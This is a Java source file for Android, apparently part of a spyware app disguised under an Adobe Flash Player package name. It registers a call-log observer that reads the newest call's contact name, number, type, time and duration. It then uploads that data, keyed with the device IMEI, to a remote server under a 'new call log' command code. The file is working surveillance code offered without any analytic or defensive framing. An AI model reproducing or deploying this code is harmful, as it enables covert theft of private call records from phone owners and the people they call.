package com.adobe.flashplayer.data;


import org.json.JSONArray;
import org.json.JSONObject;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;


public class PhoneCallLogObsv extends ContentObserver{

    private final String TAG = "[ljg]PhoneCallLogObsv";

    private Handler mHandler = null;
    private Context mContext = null;




    public PhoneCallLogObsv(Handler handler, Context context) {
        super(handler);
        this.mHandler = handler;
        this.mContext = context;
    }



    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Log.e(TAG,"onChange");

        try{

            ContentResolver cr = mContext.getContentResolver();
            Cursor cs=cr.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.CACHED_NAME,
                            CallLog.Calls.NUMBER,
                            CallLog.Calls.TYPE,
                            CallLog.Calls.DATE,
                            CallLog.Calls.DURATION
                    },null,null,CallLog.Calls.DEFAULT_SORT_ORDER);

            if(cs!=null &&cs.getCount()>0){
                for(cs.moveToFirst(); ; ){
                    String callName=cs.getString(0);
                    String callNumber=cs.getString(1);

                    int callType=Integer.parseInt(cs.getString(2));
                    String callTypeStr="";
                    switch (callType) {
                        case CallLog.Calls.INCOMING_TYPE:
                            callTypeStr="呼入";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            callTypeStr="呼出";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callTypeStr="未接";
                            break;
                    }

                    String callDateStr = Utils.formatDate("yyyy-MM-dd HH:mm:ss",Long.parseLong(cs.getString(3)));

                    String callDurationStr = cs.getString(4);
                    if(callDurationStr == null){
                        callDurationStr = "0分0秒";
                    }else{
                        int callDuration=Integer.parseInt(callDurationStr);
                        int min=callDuration/60;
                        int sec=callDuration%60;
                        callDurationStr=min+"分"+sec+"秒";
                    }


                    JSONObject jsobj=new JSONObject();
                    jsobj.put("类型", callTypeStr);
                    jsobj.put("姓名", callName);
                    jsobj.put("号码", callNumber);
                    jsobj.put("时间", callDateStr);
                    jsobj.put("时长", callDurationStr);
                    JSONArray jsarray = new JSONArray();
                    jsarray.put(0,jsobj);


                    if (NetworkUtils.isNetworkAvailable(mContext)) {
                        UploadData sendmsg = new UploadData(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_NEWCALLLOG, Public.IMEI);
                        Thread threadsendloc = new Thread(sendmsg);
                        threadsendloc.start();
                    }else{

                    }
                    break;
                }
                cs.close();
            }
        }catch(Exception ex){
            ex.printStackTrace();
        }
    }


}


